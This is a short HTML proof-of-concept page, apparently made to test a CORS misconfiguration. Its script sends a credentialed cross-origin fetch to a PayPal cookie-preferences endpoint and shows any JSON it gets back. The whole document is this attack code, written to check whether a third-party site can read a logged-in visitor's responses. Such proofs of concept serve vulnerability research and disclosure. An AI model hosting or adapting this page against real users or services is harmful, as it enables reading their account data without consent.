<html><body><h1>CORS PoC</h1><script>fetch("https://www.paypal.com/myaccount/privacy/cookieprefs/getBanner?showBanner=true&country=US&language=en&policyType=CookieBanner&originalHeaders={%22cookie%22:%22%22}&tenant=paypal&tenantData={}",{credentials:"include"}).then(r=>r.json()).then(d=>{document.getElementById("result").innerText=JSON.stringify(d,null,2)}).catch(e=>{document.getElementById("result").innerText="Error: "+e})</script><pre id="result"></pre></body></html>
